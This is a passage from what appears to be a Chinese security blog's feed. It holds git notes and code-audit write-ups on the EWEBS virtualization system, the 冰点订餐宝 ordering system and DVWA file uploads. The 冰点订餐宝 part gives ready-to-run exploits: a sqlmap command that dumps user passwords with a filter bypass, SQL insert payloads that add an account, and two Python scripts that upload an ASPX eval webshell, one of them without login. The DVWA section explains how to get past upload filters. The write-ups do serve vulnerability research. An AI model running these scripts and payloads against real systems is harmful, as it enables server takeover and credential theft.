git@github.com:autoing/RSAS-VUL-Export.git</span><br></pre></td></tr></table></figure><h4 id="强制推送"><a href="#强制推送" class="headerlink" title="强制推送"></a>强制推送</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -f origin master</span><br></pre></td></tr></table></figure><h4 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch test</span><br></pre></td></tr></table></figure><h4 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout test</span><br></pre></td></tr></table></figure><h3 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h3><h4 id="克隆-1"><a href="#克隆-1" class="headerlink" title="克隆"></a>克隆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:autoing/RSAS-VUL-Export.git</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-极通EWEBS应用虚拟化系统</title>
      <link href="/article/codeaudit-ewebs.html"/>
      <url>/article/codeaudit-ewebs.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h3><p>极通EWEBS应用虚拟化系统&lt;=7.02版本存在SQL注入漏洞，远程攻击者可利用该漏洞写入webshell，获得服务器权限。</p><h3 id="0x01-漏洞分析与利用"><a href="#0x01-漏洞分析与利用" class="headerlink" title="0x01 漏洞分析与利用"></a>0x01 漏洞分析与利用</h3><p>极通EWEBS应用虚拟化系统安装完成后，站点根目录下存在测试文件testweb.php,文件包含物理路径等敏感信息。<br>站点对SQL语句过滤不严，存在SQL注入漏洞，攻击者可以利用泄露的物理路径加上SQL注入漏洞写入webshell，获得服务器权限。</p><h4 id="存在漏洞点"><a href="#存在漏洞点" class="headerlink" title="存在漏洞点"></a>存在漏洞点</h4><p>1、用户名输入框存在SQL注入：<br><img src="../do/images/codeaudit/codeaudit-ewebs01.gif" alt></p><p>如上图，点击用户名输入框后，随便点击网页上的任何一个地方，就会向服务器发送一个用户名验证，这里没有做SQL语句过滤。</p><p>2、站点目录下存在测试文件，有站点的各种信息,安装路径、web路径等等：<br><img src="../do/images/codeaudit/codeaudit-ewebs02.png" alt></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>SQL注入为root权限，加上泄露的物理路径就可以写入webshell：</p><p>1、 必须要先访问首页链接，生成PHPSESSID</p><p>2、 把发往服务器的数据长度删除</p><p>3、 利用SQL注入写入webshell</p><p>手动验证方式：<br><img src="../do/images/codeaudit/codeaudit-ewebs03.gif" alt></p><p>脚本利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ewebs.py http://192.168.123.112:8088</span><br></pre></td></tr></table></figure><p>脚本下载链接：<a href="../do/code/ewebs.py">ewebs.py</a></p><p><img src="../do/images/codeaudit/codeaudit-ewebs04.gif" alt></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li>删除测试页面，自定义错误页面</li><li>过滤SQL语句</li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-冰点订餐宝之SQL注入、文件上传到EXP编写</title>
      <link href="/article/codeaudit-dr.html"/>
      <url>/article/codeaudit-dr.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h3><p>在很久很久以前，我有一个梦想</p><p>但是，后来我发现我的梦想渐渐没有了</p><p>于是，昨天我思考了一晚上</p><p>觉得我应该有个梦想的！</p><h3 id="0x01-漏洞介绍及测试环境"><a href="#0x01-漏洞介绍及测试环境" class="headerlink" title="0x01 漏洞介绍及测试环境"></a>0x01 漏洞介绍及测试环境</h3><p>影响版本：冰点订餐宝 V6.6.4.19044</p><p>修复方式：删除对应漏洞文件</p><p>程序前端使用.net语言编写，调用的后端全部使用C#编写，使用审计工具是扫描不到任何东西的，采用的方式是手动搜索关键词，可是苦了我这个只会Python基础的垃圾。</p><p>所有的验证文件都在bin目录下的dll文件，需要反编译才能对代码进行分析。</p><p>测试环境（保留至少一周）：<a href="http://16f782g826.iok.la/dr/Index.aspx" target="_blank" rel="noopener">http://16f782g826.iok.la/dr/Index.aspx</a></p><h3 id="0x02-SQL注入漏洞"><a href="#0x02-SQL注入漏洞" class="headerlink" title="0x02 SQL注入漏洞"></a>0x02 SQL注入漏洞</h3><p>搜索select 发现有两个文件包含SQL语句，SQL注入漏洞在以下两个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DC\PurchaseAdd.ashx</span><br><span class="line"></span><br><span class="line">DC\PurchaseModify.ashx</span><br></pre></td></tr></table></figure><p>这两个地方过滤的是大写的SQL关键词，使用随机大小写脚本可以绕过。</p><p>直接打开这两个文件进行分析，这两个注入漏洞的防护文件是一样的，这里只分析其中一个文件：<br><img src="../do/images/codeaudit/codeaudit-dr01.png" alt></p><table><thead><tr><th align="center">行数</th><th align="center">作用分析</th></tr></thead><tbody><tr><td align="center">90-98</td><td align="center">一系列的MSSQL操作，涉及的函数有四个：Dt_DR_Human_Manager、GetConnectionString、OpenConnection、clsItem</td></tr><tr><td align="center">99-100</td><td align="center">执行SQL语句</td></tr></tbody></table><p>在引用文件bin\DiningRoomOnLineDC.Common.dll上查找这四个函数都没发现有SQL过滤，根据漏洞文件的请求信息组成了链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://16f782g826.iok.la/dr/DC/PurchaseAdd.ashx?Method=GetCTList&amp;LoginUserCode=</span><br><span class="line">http://16f782g826.iok.la/dr/DC/PurchaseModify.ashx?Method=GetCTList&amp;LoginUserCode=</span><br></pre></td></tr></table></figure><p><img src="../do/images/codeaudit/codeaudit-dr02.png" alt></p><p>这里就没有什么好说的，直接SQLmap跑一下，payload、权限啥都出来了：</p><p><img src="../do/images/codeaudit/codeaudit-dr03.png" alt></p><p>在获取表名的时候发现被拦截了：</p><p><img src="../do/images/codeaudit/codeaudit-dr04.png" alt></p><p>根据拦截的关键字找到了拦截文件bin\DiningRoom.PageLib.dll，这个文件下有个safe_360.cs做了全局过滤，可惜过滤的都是大写的字符：</p><p><img src="../do/images/codeaudit/codeaudit-dr05.png" alt><br><img src="../do/images/codeaudit/codeaudit-dr06.png" alt></p><p>使用随机大小写字母绕过即可，SQLmap自带了该功能脚本，脚本名字为randomcase.py。</p><p>SQLmap完整的验证语句如下，-C后边是用户名和密码两个表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://16f782g826.iok.la/dr/DC/PurchaseAdd.ashx?Method=GetCTList&amp;LoginUserCode=&quot; --time-sec 1 -v 3 --batch -D DR -T Dt_DR_Human -C P_HumanCode,P_Password --dump --tamper=&quot;randomcase.py&quot;</span><br></pre></td></tr></table></figure><h4 id="SQL注入EXP"><a href="#SQL注入EXP" class="headerlink" title="SQL注入EXP"></a>SQL注入EXP</h4><p>既然是SQL注入，就直接写注入的EXP吧，不考虑其他的，通过SQL添加一个用户名，用户名为webtest,密码为admin，相信大家都能看懂：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; InSErT InTo dr.dbo.Dt_DR_Human (P_HumanCode,P_Password,P_MayBeLogin) VaLUeS (&apos;webtest&apos;,&apos;CD175540F41025A9&apos;,&apos;1&apos;); --</span><br></pre></td></tr></table></figure><p>测试完成之后把添加的用户名webtest删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; DeLEtE FrOm dr.dbo.Dt_DR_Human WhErE P_HumanCode=&apos;webtest&apos;; --</span><br></pre></td></tr></table></figure><p>演示图：<br><img src="../do/images/codeaudit/codeaudit-dr07.gif" alt></p><h3 id="0x03任意文件上传"><a href="#0x03任意文件上传" class="headerlink" title="0x03任意文件上传"></a>0x03任意文件上传</h3><p>通过搜索文件上传的关键词，发现一个漏洞在DC/UploadDishImgUP.aspx文件，漏洞链接如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://16f782g826.iok.la/dr/DC/UploadDishImgUP.aspx?DishCode=&amp;DishName=</span><br></pre></td></tr></table></figure><p>通过引用的文件、类、函数、上传提示信息，确定在bin\DiningRoom.PageLib.dll文件下，的有三个验证上传文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DC_UploadDishImgUP.cs</span><br><span class="line">clsUploadFileTypeCheck.cs</span><br><span class="line">UploadFile.cs</span><br></pre></td></tr></table></figure><h4 id="DC-UploadDishImgUP-cs"><a href="#DC-UploadDishImgUP-cs" class="headerlink" title="DC_UploadDishImgUP.cs:"></a>DC_UploadDishImgUP.cs:</h4><p><img src="../do/images/codeaudit/codeaudit-dr08.png" alt></p><p>55-61行代码，从请求中获取DishCode的值、上传文件的扩展名，并上传文件，这里上传成功后，在服务器保存的文件名就是：DishCode的值 + 上传文件的扩展名。</p><h4 id="clsUploadFileTypeCheck-cs"><a href="#clsUploadFileTypeCheck-cs" class="headerlink" title="clsUploadFileTypeCheck.cs:"></a>clsUploadFileTypeCheck.cs:</h4><p><img src="../do/images/codeaudit/codeaudit-dr09.png" alt></p><p>34行代码，从右到左获取文件扩展名，并转换成小写。</p><p>31行代码，读取配置文件里边，允许上传的扩展名。</p><p>20行代码，判断上传文件的扩展名是否在白名单，不存在返回-1。</p><h4 id="UploadFile-cs"><a href="#UploadFile-cs" class="headerlink" title="UploadFile.cs"></a>UploadFile.cs</h4><p><img src="../do/images/codeaudit/codeaudit-dr10.png" alt></p><p>40行代码，Request.Files[0] 意思是获取当前请求中被上传的文件。</p><p>42-43行代码，调用clsUploadFileTypeCheck.cs文件对上传文件的扩展名进行验证，验证不通过则不保存。</p><h4 id="程序验证上传文件的流程"><a href="#程序验证上传文件的流程" class="headerlink" title="程序验证上传文件的流程"></a>程序验证上传文件的流程</h4><ul><li><p>第一步<br>通过DC_UploadDishImgUP.cs上传文件，从请求中获取DishCode的值、上传文件的扩展名，并上传文件，这里上传成功后，在服务器保存的文件名就是：DishCode的值 + 上传文件的扩展名。如DishCode=1，上传的文件名为2.aspx，那么保存的文件就是1.aspx。</p></li><li><p>第二步<br>通过clsUploadFileTypeCheck.cs，验证文件是否为空，扩展名是否为白名单 。</p></li><li><p>第三步<br>通过UploadFile.cs文件，从GET请求中获取文件名，根据第二步的验证结果处理文件。</p></li></ul><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞出现在第三步，Request.Files获取文件名的方式有问题。</p><p>作为一个只会Python基础的垃圾，各大牛逼白帽群提问题，无果。花了半天时间从百度上查找Request.Files的用法，结果Request.Files用法仅仅只是获取文件名，没有其他介绍了，这里通过Request.Files[0]获取上传的文件名，如果获取的是POST请求中的文件名，看起来这里不存在文件上传漏洞。</p><p>但实际不是这样的，通过测试，这个方法可以从POST请求中获取文件名，也可以从GET请求中获取文件名，使用键值0获取文件的位置，如果有两个文件名，程序只会获取第一个文件名。<br>第一步和第三步的验证是分开的，所以可通过可控变量DishCode来设置第三步获取的文件扩展名，然后上传任意文件。</p><p>通过对DishCode传入文件名，绕过上传验证：<br><img src="../do/images/codeaudit/codeaudit-dr11.gif" alt></p><h4 id="文件上传EXP"><a href="#文件上传EXP" class="headerlink" title="文件上传EXP"></a>文件上传EXP</h4><p>这里没有任何验证，直接访问链接，通过POST上传文件，那么直接使用请求的POST数据包就可以封装成EXP：<br><img src="../do/images/codeaudit/codeaudit-dr12.png" alt></p><p>脚本只需3部分组成：</p><p>1、漏洞链接</p><p>2、CSRF验证值</p><p>3、上传文件的数据包</p><p>整体代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 获取CSRF的值</span><br><span class="line">csrf = &apos;&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; id=&quot;__VIEWSTATE&quot; value=&quot;(.*?)&quot; /&gt;&apos;</span><br><span class="line"></span><br><span class="line"># 上传文件必须的头部，从上图的数据包提取</span><br><span class="line">headers = &#123;&quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryQY7B9hyYl0c8HCTJ&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 上传文件的数据包</span><br><span class="line">post_data = &apos;&apos;&apos;</span><br><span class="line">------WebKitFormBoundaryQY7B9hyYl0c8HCTJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;__VIEWSTATE&quot;</span><br><span class="line"></span><br><span class="line">&#123;&#125;</span><br><span class="line">------WebKitFormBoundaryQY7B9hyYl0c8HCTJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;__VIEWSTATEENCRYPTED&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryQY7B9hyYl0c8HCTJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;btnOK&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryQY7B9hyYl0c8HCTJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;FileUpload1&quot;; filename=&quot;index.aspx&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;123&quot;],&quot;unsafe&quot;));%&gt;</span><br><span class="line">------WebKitFormBoundaryQY7B9hyYl0c8HCTJ--</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"># 从传入的参数获取链接</span><br><span class="line">url = chk_url = sys.argv[1]</span><br><span class="line"></span><br><span class="line"># 漏洞链接</span><br><span class="line">payload = &apos;/DC/UploadDishImgUP.aspx?DishCode=quan.png&amp;DishName=&apos;</span><br><span class="line">chk_url += payload</span><br><span class="line"></span><br><span class="line">content = requests.get(chk_url)</span><br><span class="line">csrf_value = re.findall(csrf, content.text)</span><br><span class="line"></span><br><span class="line"># 这里的数据包加上获取的CSRF验证值</span><br><span class="line">content = requests.post(chk_url, headers=headers, data=post_data.format(csrf_value[0]))</span><br><span class="line"># 如果文件上传成功，不会返回弹窗，这里只需要判断alert是否在返回的文件就知道啥哼传的文件是否成功</span><br><span class="line">if &apos;alert&apos; not in content.text:</span><br><span class="line">    shell = url + &apos;/UploadFile/quan.png.aspx&apos;</span><br><span class="line">    # 验证webshell</span><br><span class="line">    if requests.get(shell).status_code == 200:</span><br><span class="line">        print(&apos;Upload success！\nwebshell：&#123;&#125; password：123&apos;.format(shell))</span><br><span class="line">else:</span><br><span class="line">    print(&apos;Upload lose！&apos;)</span><br></pre></td></tr></table></figure><p>演示图：<br><img src="../do/images/codeaudit/codeaudit-dr13.gif" alt></p><h3 id="0x04未授权文件上传"><a href="#0x04未授权文件上传" class="headerlink" title="0x04未授权文件上传"></a>0x04未授权文件上传</h3><p>时隔半个月，又再一次看这套代码，同事天天吓唬说某数字安全公司说又挖到了啥漏洞，没办法，我们做的是同一个项目，两家公司做的同一个项目…</p><p>一直不喜欢挖后端漏洞，但是蚊子腿也是肉啊，然后挖到一个后台文件上传，在编写EXP的过程，这个漏洞又变成了未授权文件上传。</p><p>漏洞链接，直接访问是需要登录的：<a href="http://16f782g826.iok.la/dr/db/DBRS.aspx" target="_blank" rel="noopener">http://16f782g826.iok.la/dr/db/DBRS.aspx</a></p><p>来看代码：</p><p>漏洞出现在db\DBRS.aspx文件的引用文件bin\DiningRoom.PageLib.dll的db_DBRS.cs类文件第59-77行代码（）：<br><img src="../do/images/codeaudit/codeaudit-dr14.png" alt></p><p>第63-66行代码，这里从右到左判断文件扩展名是否是.zip扩展名的，所以不管在前端怎么改，只要扩展名不是.zip的都无法突破这里，函数代码如下（同文件第114-125行代码）：<br><img src="../do/images/codeaudit/codeaudit-dr15.png" alt></p><p>第69-71行代码，这里主要是通过上一步验证后保存文件，然后解压文件<br>第72行代码（漏洞所在行），这里是删除上传后的压缩包文件，但是解压后的文件不会删除，那么这里就可以把webshell打包成zip文件，上传后程序会把webshell解压出来，然后删除上传的压缩包，而webshell不会被删除。</p><p>来看看上传的数据包：<br><img src="../do/images/codeaudit/codeaudit-dr16.png" alt></p><p>在编写EXP的过程中，登陆之后的CSRF值一直没办法获取到，要不就是上传跳转到登录页面，然后…把这个值删了，上传成功！就变成未授权文件上传了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = sys.argv[1]</span><br><span class="line"></span><br><span class="line"># 这里还是文件上传的头部，从上传的数据包提取</span><br><span class="line">headers = &#123;&quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundarywwugP6jAQok20T1v&quot;&#125;</span><br><span class="line"># 上传文件的POST数据包，上传的文件要二进制编码之后放进去，不能Python直接二进制编码，不然上传后的压缩包会出错</span><br><span class="line">post_data = &apos;&apos;&apos;</span><br><span class="line">------WebKitFormBoundarywwugP6jAQok20T1v</span><br><span class="line">Content-Disposition: form-data; name=&quot;__EVENTTARGET&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywwugP6jAQok20T1v</span><br><span class="line">Content-Disposition: form-data; name=&quot;__EVENTARGUMENT&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywwugP6jAQok20T1v</span><br><span class="line">Content-Disposition: form-data; name=&quot;__VIEWSTATE&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywwugP6jAQok20T1v</span><br><span class="line">Content-Disposition: form-data; name=&quot;__VIEWSTATEENCRYPTED&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywwugP6jAQok20T1v</span><br><span class="line">Content-Disposition: form-data; name=&quot;FileUpload1&quot;; filename=&quot;webshell.zip&quot;</span><br><span class="line">Content-Type: application/zip</span><br><span class="line"></span><br><span class="line">PK\x03\x04\n\x00\x00\x00\x00\x00\xa3TtN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00webshell/PK\x03\x04\x14\x00\x00\x00\x08\x00\xa3TtN\xf2k\x8d\x9aW\x00\x00\x00W\x00\x00\x00\x16\x00\x00\x00webshell/webshell.aspx\xb3QuP\x08HLOU\xf0I\xccK/\x052l\x95\xbc\x8a\x93\x8b2\x0bJ\x94T\xedlT\x83R\x8b\x0b\xf2\xf3\x8aS\xf5\xc2\x8b2KR5R\xcb\x12s4\x82R\x0bKS\x8bK\xf4&lt;KRs\xa3\x95\n\x12\x8b\x8b\xcbS\x94bu\x94J\xf3\x8a\x13\xd3R\x9545\xadU\xed\x00PK\x01\x02\x1f\x00\n\x00\x00\x00\x00\x00\xa3TtN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00$\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00webshell/\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xbcoZ\xcf\xc5\xde\xd4\x01\xd9\xbdZ\xcf\xc5\xde\xd4\x01\x98c\xca\xc7\xc5\xde\xd4\x01PK\x01\x02\x1f\x00\x14\x00\x00\x00\x08\x00\xa3TtN\xf2k\x8d\x9aW\x00\x00\x00W\x00\x00\x00\x16\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00&apos;\x00\x00\x00webshell/webshell.aspx\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xbcoZ\xcf\xc5\xde\xd4\x01\xbcoZ\xcf\xc5\xde\xd4\x01\xbcoZ\xcf\xc5\xde\xd4\x01PK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xc3\x00\x00\x00\xb2\x00\x00\x00\x00\x00</span><br><span class="line">------WebKitFormBoundarywwugP6jAQok20T1v</span><br><span class="line">Content-Disposition: form-data; name=&quot;btnUpload&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywwugP6jAQok20T1v--</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">url_chck = url + &apos;/db/dbrs.aspx&apos;</span><br><span class="line">webshell = url + &apos;/temp/webshell/webshell.aspx&apos;</span><br><span class="line"># 上传文件成功后会返回物理路径，包含bak,判断bak是否在内容里边就知道文件上传成功与否</span><br><span class="line">if &apos;.bak&apos; in requests.post(url_chck, headers=headers, data=post_data).text:</span><br><span class="line">    code = requests.get(webshell)</span><br><span class="line">    if code.status_code == 200:</span><br><span class="line">        print(&apos;webshell：&#123;&#125; passwd：passwd&apos;.format(webshell))</span><br></pre></td></tr></table></figure><p>演示图：<br><img src="../do/images/codeaudit/codeaudit-dr17.gif" alt></p><h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><p><img src="../do/images/joke/jiecao.gif" alt></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-DVWA-文件上传</title>
      <link href="/article/codeaudit-dvwa-file-upload.html"/>
      <url>/article/codeaudit-dvwa-file-upload.html</url>
      
        <content type="html"><![CDATA[<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-12.png" alt><br>第5行代码设置了上传的路径。<br>第6行获取上传的文件名。<br>第9行将上传的文件移动到新位置。</p><p>没有设置任何过滤，效果如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-13.gif" alt></p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-14.png" alt></p><p>第14-15行代码设置了文件的条件，上传的文件类型为图片才可以上传，否则不进行上传。</p><p>那么这里只需要上传php文件，改上传的文件类型即可：</p><p>效果如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-15.gif" alt></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>代码如图：<br><img src="../do/images/codeaudit/codeaudit-dvwa-16.png" alt><br>第10行代码，使用strrpos()函数判断最后一个[.]出现在什么地方，substr()函数取回[.]后边的字符。如果文件名是index.php那么取回的字符就是php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br></pre></td></tr></table></figure><p>第15行代码，使用strtolower()函数将上一步获得的字符转换成小写，然后再判断是不是图片后缀的文件，并且使用getimagesize()函数获取图片的信息，如果不是图片类型，上传就失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) )</span><br></pre></td></tr></table></figure><p>要成功上传文件,那么这里上传的文件后缀一定是[.]图片扩展名的，并且图片要包含图片信息。</p><p>绕过方式：在上传的文件添加图片类型信息，并使用空字节进行截断。这里使用%00(空字节)进行绕过，空字节会被服务器认为是结束符号，其他方法没试，不同环境就可能产生意想不到的解析效果，搭配fuzz使用效果更佳，效果如图：</p><p>有些落伍了，平时测试没碰到过空字节的，现在测试发现，PHP5.2-PHP5.5空字节全部失效，PHP空字节截断估计再也没法实现了，这个高难度，哎呀难死了！<br><img src="../do/images/codeaudit/codeaudit-hoho.gif" alt></p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // File information</span><br><span class="line">    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br><span class="line">    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">    // Where are we going to be writing to?</span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;;</span><br><span class="line">    //$target_file   = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . 